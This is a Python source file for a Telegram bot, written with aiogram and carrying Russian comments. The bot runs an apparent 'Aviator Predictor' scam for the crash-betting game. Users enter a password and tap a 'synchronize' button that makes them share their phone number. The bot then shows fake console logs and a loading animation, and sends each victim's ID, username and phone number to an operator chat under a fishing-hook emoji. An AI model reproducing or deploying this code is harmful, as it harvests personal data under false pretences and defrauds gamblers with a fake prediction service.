import json
import os
import logging
from aiogram import Dispatcher, types
from aiogram.filters import CommandStart, BaseFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from config import SECRET_PASSWORD, CHAT_ID
from database import save_user, check_user_registration, get_user
from phonenumbers import geocoder
import phonenumbers
from animations import loading_animation, fake_console_logs

logger = logging.getLogger(__name__)

# –§–∏–ª—å—Ç—Ä –¥–ª—è –∏—Å–∫–ª—é—á–µ–Ω–∏—è –∞–¥–º–∏–Ω—Å–∫–æ–≥–æ —á–∞—Ç–∞
class NotAdminChatFilter(BaseFilter):
    async def __call__(self, message: types.Message) -> bool:
        return str(message.chat.id) != CHAT_ID

class AuthState(StatesGroup):
    waiting_for_password = State()
    waiting_for_sync = State()

# –ú–∞–ø–ø–∏–Ω–≥ —Å—Ç—Ä–∞–Ω –Ω–∞ —è–∑—ã–∫–∏
COUNTRY_TO_LANG = {
    "Russia": "ru",
    "United States": "en",
    "United Kingdom": "en",
    "Spain": "es",
    # –î–æ–±–∞–≤—å—Ç–µ –¥—Ä—É–≥–∏–µ —Å—Ç—Ä–∞–Ω—ã –∏ —è–∑—ã–∫–∏ –ø–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏
}

# –ü–∞–ø–∫–∞ —Å JSON-–ø–µ—Ä–µ–≤–æ–¥–∞–º–∏
LANG_DIR = "lang"

def load_language_messages(lang_code):
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏—è –∏–∑ JSON –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —è–∑—ã–∫–∞, –¥–µ—Ñ–æ–ª—Ç ‚Äî –∞–Ω–≥–ª–∏–π—Å–∫–∏–π."""
    try:
        file_path = os.path.join(LANG_DIR, f"{lang_code}.json")
        if not os.path.exists(file_path):
            logger.warning(f"–Ø–∑—ã–∫ {lang_code} –Ω–µ –Ω–∞–π–¥–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É—é en")
            file_path = os.path.join(LANG_DIR, "en.json")
        with open(file_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —è–∑—ã–∫–∞ {lang_code}: {e}")
        return {
            "welcome": "@{username}, you have successfully registered in Aviator Predictor! Contact the operator for further instructions.",
            "final_welcome": "üéâ You have successfully registered in Aviator Bot!",
            "already_registered": "üîç You are already registered!",
            "enter_password": "üîê Enter password:",
            "password_correct": "‚úÖ Password correct! Synchronize your account:",
            "password_incorrect": "‚ùå Wrong password. Try again:",
            "sync": "üîÑ Synchronize your account",
            "total": [
                "üéØ Here's your total!",
                "üöÄ Catch the moment!",
                "‚úÖ Your total is ready!",
                "üî• Total delivered!",
                "üí• Check this out!",
                "üåü Your result is here!",
                "‚ö° Total incoming!",
                "üé∞ Ready for the total?",
                "üèÜ Here it comes!",
                "üéâ Total for you!"
            ],
            "error": [
                "ü§ñ Neural networks can make mistakes, it's okay!",
                "‚ö†Ô∏è Something went wrong, try again!",
                "üìû Contact support."
            ]
        }

def get_country_name(phone_number):
    """–ü–æ–ª—É—á–∞–µ—Ç –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã –ø–æ –Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞."""
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country = geocoder.description_for_number(parsed_number, "en")
        logger.info(f"–°—Ç—Ä–∞–Ω–∞ –¥–ª—è {phone_number}: {country}")
        return country if country else "Unknown"
    except phonenumbers.NumberParseException as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Å—Ç—Ä–∞–Ω—ã –¥–ª—è {phone_number}: {e}")
        return "Unknown"

def get_user_language(country):
    """–û–ø—Ä–µ–¥–µ–ª—è–µ—Ç —è–∑—ã–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å—Ç—Ä–∞–Ω—ã."""
    return COUNTRY_TO_LANG.get(country, "en")

def register_user_handlers(dp: Dispatcher, bot):
    """–†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏."""
    logger.info("–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –≤ user_bot.py")

    @dp.message(NotAdminChatFilter(), CommandStart())
    async def start_handler(message: types.Message, state: FSMContext):
        telegram_id = message.from_user.id
        logger.info(f"/start –æ—Ç user_id={telegram_id}, chat_id={message.chat.id}")

        try:
            if check_user_registration(telegram_id):
                user = get_user(telegram_id)
                if not user:
                    logger.error(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {telegram_id} –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω, –Ω–æ –Ω–µ –Ω–∞–π–¥–µ–Ω")
                    await message.answer("‚ùå Error, try again")
                    return
                country = user[3] or "Unknown"
                lang_code = get_user_language(country)
                messages = load_language_messages(lang_code)
                await message.answer(messages["already_registered"])
                return

            logger.info(f"–ù–∞—á–∞–ª–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –¥–ª—è user_id={telegram_id}")
            await state.set_state(AuthState.waiting_for_password)
            messages = load_language_messages("en")  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∞–Ω–≥–ª–∏–π—Å–∫–∏–π –¥–ª—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
            await message.answer(messages["enter_password"])
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ /start –¥–ª—è user_id={telegram_id}: {e}")
            await message.answer("‚ùå Error, try again")

    @dp.message(AuthState.waiting_for_password)
    async def password_handler(message: types.Message, state: FSMContext):
        telegram_id = message.from_user.id
        logger.info(f"–ü–∞—Ä–æ–ª—å –æ—Ç user_id={telegram_id}")
        try:
            messages = load_language_messages("en")  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∞–Ω–≥–ª–∏–π—Å–∫–∏–π –¥–ª—è —Å–æ–æ–±—â–µ–Ω–∏–π –æ –ø–∞—Ä–æ–ª–µ
            if message.text == SECRET_PASSWORD:
                await state.set_state(AuthState.waiting_for_sync)
                keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="üîÑ Synchronize", callback_data="request_sync")]
                    ]
                )
                await message.answer(messages["password_correct"], reply_markup=keyboard)
            else:
                await message.answer(messages["password_incorrect"])
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –ø–∞—Ä–æ–ª—è –¥–ª—è user_id={telegram_id}: {e}")
            await message.answer("‚ùå Error, try again")

    @dp.callback_query(lambda c: c.data == "request_sync")
    async def request_sync_handler(callback: types.CallbackQuery, state: FSMContext):
        telegram_id = callback.from_user.id
        logger.info(f"–ó–∞–ø—Ä–æ—Å —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ –æ—Ç user_id={telegram_id}")
        try:
            messages = load_language_messages("en")  # –ê–Ω–≥–ª–∏–π—Å–∫–∏–π –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏
            keyboard = types.ReplyKeyboardMarkup(
                keyboard=[[types.KeyboardButton(text="üîÑ Synchronization", request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –≤–º–µ—Å—Ç–æ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
            await callback.message.answer(messages["sync"], reply_markup=keyboard)
            # –£–¥–∞–ª—è–µ–º —Å—Ç–∞—Ä–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å inline-–∫–Ω–æ–ø–∫–æ–π
            await callback.message.delete()
            await callback.answer()
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ –¥–ª—è user_id={telegram_id}: {e}")
            await callback.message.answer("‚ùå Error, try again")
            await callback.message.delete()

    @dp.message(AuthState.waiting_for_sync)
    async def sync_handler(message: types.Message, state: FSMContext):
        telegram_id = message.from_user.id
        logger.info(f"–°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è –æ—Ç user_id={telegram_id}")
        try:
            if not message.contact:
                logger.warning(f"–ù–µ—Ç –∫–æ–Ω—Ç–∞–∫—Ç–∞ –æ—Ç user_id={telegram_id}")
                messages = load_language_messages("en")  # –ê–Ω–≥–ª–∏–π—Å–∫–∏–π –¥–ª—è –æ—à–∏–±–∫–∏
                await message.answer(messages["sync"])
                return

            phone = message.contact.phone_number
            username = message.from_user.username or "NoName"
            country = get_country_name(phone)
            lang_code = get_user_language(country)
            messages = load_language_messages(lang_code)

            if save_user(telegram_id, username, phone, country):
                try:
                    # –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ –∞–¥–º–∏–Ω—Å–∫–∏–π —á–∞—Ç
                    await bot.send_message(
                        CHAT_ID,
                        f"üé£ –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω!\n"
                        f"üÜî ID: <code>{telegram_id}</code>\n"
                        f"üë§ Username: @{username}\n"
                        f"üì± Number: <code>{phone}</code>",
                        parse_mode="HTML"
                    )
                    logger.info(f"–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ CHAT_ID={CHAT_ID} –¥–ª—è user_id={telegram_id}")
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ CHAT_ID={CHAT_ID} –¥–ª—è user_id={telegram_id}: {e}")

                # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏—é —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏
                try:
                    await loading_animation(message)
                    await fake_console_logs(message)
                    logger.info(f"–ê–Ω–∏–º–∞—Ü–∏—è —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ –ø–æ–∫–∞–∑–∞–Ω–∞ –¥–ª—è user_id={telegram_id}")
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ –∞–Ω–∏–º–∞—Ü–∏–∏ –¥–ª—è user_id={telegram_id}: {e}")

                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –æ–±—Ä–∞—â–µ–Ω–∏–µ–º –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É
                welcome_message = messages["welcome"].format(username=username)
                await message.answer(welcome_message)

                # –§–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
                await message.answer(messages["final_welcome"])
            else:
                logger.warning(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è user_id={telegram_id}, –≤–æ–∑–º–æ–∂–Ω–æ –¥—É–±–ª–∏–∫–∞—Ç")
                await message.answer(messages["already_registered"])

            await state.clear()
            await message.answer("‚úÖ Registration complete!", reply_markup=ReplyKeyboardRemove())
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏–∏ –¥–ª—è user_id={telegram_id}: {e}")
            await message.answer("‚ùå Error, try again")
            await state.clear()
            await message.answer("‚ùå Registration failed!", reply_markup=ReplyKeyboardRemove())